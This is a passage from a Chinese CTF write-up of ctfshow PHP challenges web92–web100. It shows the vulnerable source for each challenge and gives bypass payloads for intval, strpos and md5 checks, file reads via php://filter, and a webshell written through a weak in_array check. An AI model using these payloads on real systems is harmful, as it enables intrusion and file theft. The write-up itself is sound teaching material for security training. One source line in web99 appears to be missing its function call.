</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">intval</span><span class="p">(</span><span class="nv">$num</span><span class="p">,</span><span class="mi">0</span><span class="p">)</span><span class="o">==</span><span class="mi">4476</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">        <span class="k">echo</span> <span class="nv">$flag</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">        <span class="k">echo</span> <span class="nx">intval</span><span class="p">(</span><span class="nv">$num</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>这题与90题的区别就在于这里进行的是弱类型的比较</p>
<p>在弱类型的比较里面我们不能通过增加字母的方式绕过，如下</p>
<pre tabindex="0"><code>&#34;123aa&#34; == 123
&#34;123aa&#34; === 123aa
</code></pre><p>我们可以通过其它方法来绕过</p>
<p>如通过intval函数的特性，我们可以通过输入转换成其他进制的4476来进行绕过（前面说过当base=0时会自动进行进制的转换）。</p>
<p>payload：</p>
<pre tabindex="0"><code>HEX: 0x117c //十进制前面补0x
OCT: 010574 //八进制前面补0
</code></pre><p>或者</p>
<p>官方题解</p>
<blockquote>
<p>intval()函数如果$base为0则$var中存在字母的话遇到字母就停止读取,但是e这个字母比较特殊，可以在PHP中不是科学计数法。所以为了绕过前面的==4476，我们就可以构造 4476e123</p></blockquote>
<h4 id="web93">web93<a hidden class="anchor" aria-hidden="true" href="#web93">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: Firebasky
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-16 11:25:09
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-18 16:32:58
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="k">include</span><span class="p">(</span><span class="s2">&#34;flag.php&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;num&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="nv">$num</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;num&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nv">$num</span><span class="o">==</span><span class="mi">4476</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="s2">&#34;no no no!&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/[a-z]/i&#34;</span><span class="p">,</span> <span class="nv">$num</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="s2">&#34;no no no!&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">intval</span><span class="p">(</span><span class="nv">$num</span><span class="p">,</span><span class="mi">0</span><span class="p">)</span><span class="o">==</span><span class="mi">4476</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">        <span class="k">echo</span> <span class="nv">$flag</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl">        <span class="k">echo</span> <span class="nx">intval</span><span class="p">(</span><span class="nv">$num</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">28</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><pre tabindex="0"><code>preg_match(&#34;/[a-z]/i&#34;, $num)
</code></pre><p>相比上一题这题增加了一个字母的匹配，让我们不能用上一题e绕过的方法和十六进制绕过的方法</p>
<p>但是八进制绕过依旧是可行的，因为他不包含字母</p>
<p>payload:</p>
<pre tabindex="0"><code>num=010574
</code></pre><h4 id="web94">web94<a hidden class="anchor" aria-hidden="true" href="#web94">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-16 11:25:09
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-18 16:46:19
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="k">include</span><span class="p">(</span><span class="s2">&#34;flag.php&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;num&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="nv">$num</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;num&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nv">$num</span><span class="o">===</span><span class="s2">&#34;4476&#34;</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="s2">&#34;no no no!&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/[a-z]/i&#34;</span><span class="p">,</span> <span class="nv">$num</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="s2">&#34;no no no!&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">strpos</span><span class="p">(</span><span class="nv">$num</span><span class="p">,</span> <span class="s2">&#34;0&#34;</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="s2">&#34;no no no!&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">intval</span><span class="p">(</span><span class="nv">$num</span><span class="p">,</span><span class="mi">0</span><span class="p">)</span><span class="o">===</span><span class="mi">4476</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl">        <span class="k">echo</span> <span class="nv">$flag</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">28</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">29</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><pre tabindex="0"><code>!strpos($num, &#34;0&#34;)
</code></pre><p>这题增加了一个条件，同时判断也变成了强判定，这里的<code>strpos()</code>函数用于查找字符串在另一个字符串中首次出现的位置。</p>
<p>也就是这里我们需要让首位不等于0才能使这个判断为false</p>
<h5 id="strops函数绕过">strops函数绕过：<a hidden class="anchor" aria-hidden="true" href="#strops函数绕过">#</a></h5>
<blockquote>
<p>对于strpos()函数，我们可以利用换行进行绕过（%0a）
payload:?num=%0a010574
也可以小数点绕过
payload：?num=4476.0
因为intval()函数只读取整数部分
还可以八进制绕过(%20是空格的url编码形式)
payload：?num=%20010574
?num= 010574 // 前面加个空格
?num=+010574
?num=+4476.0</p></blockquote>
<p>我们选用其中一个绕过方法即可</p>
<p>如空格绕过</p>
<pre tabindex="0"><code>?num=%20010574
</code></pre><p>这题因为用的是强判定也可以用这种方法</p>
<pre tabindex="0"><code>?num=4476.0
</code></pre><p>这种方法就是使其变为浮点型从而使强判定为false，绕过第一个判定</p>
<h4 id="web95">web95<a hidden class="anchor" aria-hidden="true" href="#web95">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-16 11:25:09
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-18 16:53:59
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="k">include</span><span class="p">(</span><span class="s2">&#34;flag.php&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;num&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="nv">$num</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;num&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nv">$num</span><span class="o">==</span><span class="mi">4476</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="s2">&#34;no no no!&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/[a-z]|\./i&#34;</span><span class="p">,</span> <span class="nv">$num</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="s2">&#34;no no no!!&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">strpos</span><span class="p">(</span><span class="nv">$num</span><span class="p">,</span> <span class="s2">&#34;0&#34;</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="s2">&#34;no no no!!!&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">intval</span><span class="p">(</span><span class="nv">$num</span><span class="p">,</span><span class="mi">0</span><span class="p">)</span><span class="o">===</span><span class="mi">4476</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl">        <span class="k">echo</span> <span class="nv">$flag</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">28</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">29</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>这题和上一题的区别就是改为了弱判定</p>
<p>所以上一题的方法二就用不了了，我们用方法一即可</p>
<p>payload:</p>
<pre tabindex="0"><code>?num=%20010574
</code></pre><h4 id="web96">web96<a hidden class="anchor" aria-hidden="true" href="#web96">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-16 11:25:09
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-18 19:21:24
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">
</span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;u&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;u&#39;</span><span class="p">]</span><span class="o">==</span><span class="s1">&#39;flag.php&#39;</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="s2">&#34;no no no&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">        <span class="nx">highlight_file</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;u&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">
</span></span><span class="line"><span class="ln">23</span><span class="cl">
</span></span><span class="line"><span class="ln">24</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>我们知道./指的的是当前目录，所以直接用./绕过即可，不影响文件读取</p>
<p>payload:</p>
<pre tabindex="0"><code>?u=./flag.php
</code></pre><p>or</p>
<pre tabindex="0"><code>u=/var/www/html/flag.php
?u=php://filter/read=convert.base64-encode/resource=flag.php
</code></pre><h4 id="web97">web97<a hidden class="anchor" aria-hidden="true" href="#web97">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-16 11:25:09
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-18 19:36:32
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="k">include</span><span class="p">(</span><span class="s2">&#34;flag.php&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;a&#39;</span><span class="p">])</span> <span class="k">and</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;b&#39;</span><span class="p">]))</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;a&#39;</span><span class="p">]</span> <span class="o">!=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;b&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">md5</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;a&#39;</span><span class="p">])</span> <span class="o">===</span> <span class="nx">md5</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;b&#39;</span><span class="p">]))</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl"><span class="k">echo</span> <span class="nv">$flag</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl"><span class="k">else</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="k">print</span> <span class="s1">&#39;Wrong.&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div><p>这是一道md5强比较的题目，绕过姿势挺多</p>
<p>我们可以通过简单的数组绕过</p>
<pre tabindex="0"><code>a[]=1&amp;b[]=2
</code></pre><p>虽然会报错但是能拿到flag</p>
<p><img alt="image-20241130204752518" loading="lazy" src="assets/image-20241130204752518.png"></p>
<h4 id="web98">web98<a hidden class="anchor" aria-hidden="true" href="#web98">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-16 11:25:09
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-18 21:39:27
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="k">include</span><span class="p">(</span><span class="s2">&#34;flag.php&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="nv">$_GET</span><span class="o">?</span><span class="nv">$_GET</span><span class="o">=&amp;</span><span class="nv">$_POST</span><span class="o">:</span><span class="s1">&#39;flag&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;flag&#39;</span><span class="p">]</span><span class="o">==</span><span class="s1">&#39;flag&#39;</span><span class="o">?</span><span class="nv">$_GET</span><span class="o">=&amp;</span><span class="nv">$_COOKIE</span><span class="o">:</span><span class="s1">&#39;flag&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;flag&#39;</span><span class="p">]</span><span class="o">==</span><span class="s1">&#39;flag&#39;</span><span class="o">?</span><span class="nv">$_GET</span><span class="o">=&amp;</span><span class="nv">$_SERVER</span><span class="o">:</span><span class="s1">&#39;flag&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;HTTP_FLAG&#39;</span><span class="p">]</span><span class="o">==</span><span class="s1">&#39;flag&#39;</span><span class="o">?</span><span class="nv">$flag</span><span class="o">:</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">
</span></span><span class="line"><span class="ln">19</span><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div><blockquote>
<p><a href="https://blog.csdn.net/bys617120/article/details/135314637">CTFSHOW web入门刷题 web98-112_ctfshow web98-CSDN博客</a></p>
<p>这道题用到了三元运算符</p>
<p>首先判断是否GET传入了数据，如果传入了则将POST的地址赋值给了GET</p>
<p>其实就是用POST替换GET</p>
<p>如果GET存在flag字段的值则会继续替换，最后替换成SERVER</p>
<p>这里我们只要GET随便传入一个数据让post替换get</p>
<p>然后post传入 HTTP_FLAG=flag</p>
<p>这样最后highlight_file就能去显示$flag</p></blockquote>
<p>这道题一开始没看懂代码，看了上面大佬的解释感觉其实也不难</p>
<p><img alt="image-20241201230323939" loading="lazy" src="assets/image-20241201230323939.png"></p>
<h4 id="web99">web99<a hidden class="anchor" aria-hidden="true" href="#web99">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-16 11:25:09
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-18 22:36:12
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="nv">$allow</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="k">for</span> <span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">36</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="mh">0x36d</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span> 
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="nx">array_push</span><span class="p">(</span><span class="nv">$allow</span><span class="p">,</span> <span class="nx">rand</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="nv">$i</span><span class="p">));</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;n&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nx">in_array</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;n&#39;</span><span class="p">],</span> <span class="nv">$allow</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;n&#39;</span><span class="p">],</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;content&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">
</span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div><p>这道题首先是创建了一个数组，然后通过循环写入数字（范围0~0x36d）</p>
<p><img alt="image-20241202141710538" loading="lazy" src="assets/image-20241202141710538.png"></p>
<p>接着对传入的n进行判断，判断其是否在数组中，若存在则以n为名字创建一个文件并写入content的内容</p>
<p>我们需要知道的是：</p>
<blockquote>
<p>在弱类型中当php字符串和int比较时,字符串会被转换成int，所以 字符串中数字后面的字符串会被忽略。题目中的in_array没有设置type,我们可以输入字符串5.php(此处数字随意，只要在rand(1,0x36d)之间即可),转换之后也就是5,明显是在题目中生成的数组中的</p></blockquote>
<p>所以我们通过传入content写马后，通过蚁剑连接或者直接命令执行即可得到flag</p>
<p><img alt="image-20241202141941439" loading="lazy" src="assets/image-20241202141941439.png"></p>
<h4 id="web100">web100<a hidden class="anchor" aria-hidden="true" href="#web100">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm">\# -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm">\# @Author: h1xa
